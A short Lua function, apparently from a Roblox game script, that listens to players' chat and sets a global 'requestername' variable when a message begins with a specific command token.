function ConnectP1(plr)
    if plr == playerA then return end
	plr.Chatted:Connect(function(msg)
		local command, message = string.match(msg, '^(%S+)%s+(.*)$')
		if command == "..getrequestername2834" and message then
			requestername = message
		end
	end)
end

